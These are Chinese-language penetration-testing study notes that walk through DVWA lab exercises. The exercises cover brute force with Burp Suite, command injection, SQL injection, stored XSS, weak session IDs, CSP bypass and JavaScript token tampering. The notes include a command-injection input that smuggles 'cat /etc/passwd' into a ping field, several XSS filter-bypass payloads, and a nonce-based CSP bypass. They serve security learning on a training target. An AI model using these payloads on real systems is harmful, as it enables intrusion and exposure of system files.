# 渗透测试基础08

# 其他web漏洞介绍（DVWA—Brute Force3暴力破解、Command Injection（命令执行漏洞）、SQL Injection（sql注入攻击）、Stored Cross Site Scripting (XSS)存储型跨站脚本攻击、Weak Session IDs、CSP Bypass、JavaScript Attacks）

## 所用靶场DVWA：

默认用户名
admin
password



## burpsuite使用

如果安装了java，cmd输入java可以执行，但是burp还是打不开
新建一个bat文件
java -jar BurpUnlimited.jar



## 靶场：Brute Force——暴力破解

**可以仔细观察密码输入错误和正确的页面返回大小是不一样的**

使用burp抓包，send to intruder，调整相应参数后进行攻击。

![image-20220109214045696](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109214045696.png)

![image-20220109214130442](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109214130442.png)

![image-20220109214138355](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109214138355.png)

![image-20220109214224728](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109214224728.png)

![image-20220109214521397](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109214521397.png)



### sinper模式

单向爆破
用途：你知道用户名不知道密码，破解一些单一输入框

### battering ram模式：

并发攻击，对多个目标进行单一的payload攻击
也就是用户名和密码一样的情况（工号，学号）

### pitchform模式：

交叉攻击（撞库）
有几个变量就可以选择几个字典，在这几个字典里随机抽出来尝试密码

### cluster bomb模式：

穷举模式
完整的爆破



### 高级别暴力破解例子：验证码？

1.使用打码平台

2.人工智能（机器学习，深度学习，神经网络）



## Command Injection（命令执行漏洞）

一个地方可以执行操作系统的命令

```
#通过源代码查看，然后得到可以操作ping命令
输入框里输入127.0.0.1&cat /etc/passwd
实际得到：
ping 127.0.0.1&cat /etc/passwd  #几乎同时执行
ping 127.0.0.1&&cat /etc/passwd  #执行完左边执行右边
ping 127.0.0.1|cat /etc/passwd  #只执行右边的命令
```



## SQL Injection（sql注入攻击）

medium
POST提交
burp抓包
右键-send to repeater



## Stored Cross Site Scripting (XSS)存储型跨站脚本攻击

```
haha
<script>alert('nihao')</script>

# 替换了<script>为空
# 转义了' "
haha
<scr<script>ipt>alert(1)</script>

# 前端代码是不识别script标签大小写的
haha
<scRiPt>alert(1)</sCRipt>

# 图片无法加载也可以触发js
<img src='x' onerror='alert(1)'/>

## 配合burpsuite神器使用
```

见CTF-初识XSS

## Weak Session IDs

脆弱的session id

有的网站用户登录之后会给一个session id作为用户的标识符，如果你知道其他人的session id，并且伪造，就有可能不通过用户名密码登录对方的帐号



## CSP Bypass

浏览器安全策略【验证合法性的来源】

对xss有防护作用的——所以**需要看源代码以突破防护**

只允许执行某些网站的东西，那你就到这个网站上想办法写一个js的地址

https://pastebin.com/

### **medium**：

unsafe-inline   #允许使用内联资源 比如：javascript:xxx.com  onclick  style 
nonce-source  #允许特定内联模块 比如：nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="

因此可以：

```
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert('haha')</script>
```



## JavaScript Attacks

js攻击——

**攻击web前端安全**



**需要知道token的算法是什么，看懂token算法的js代码，然后去推**



### low

在控制台输入
md5(rot13("success"));
得到token

![image-20220109222426153](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109222426153.png)

然后替换

![image-20220109222445498](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109222445498.png)



### medium

查看源代码

然后百度搜索js代码格式化：查看js内容

XXsuccessXX

然后翻转

得到XXsseccusXX

更改token



### high

解密特征混淆算法的网站
http://deobfuscatejavascript.com/

解密得到js代码内容

![image-20220109222926778](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/image-20220109222926778.png)

控制台，输入得到的js所有代码运行一下

然后进行推算、运行、复制、提交

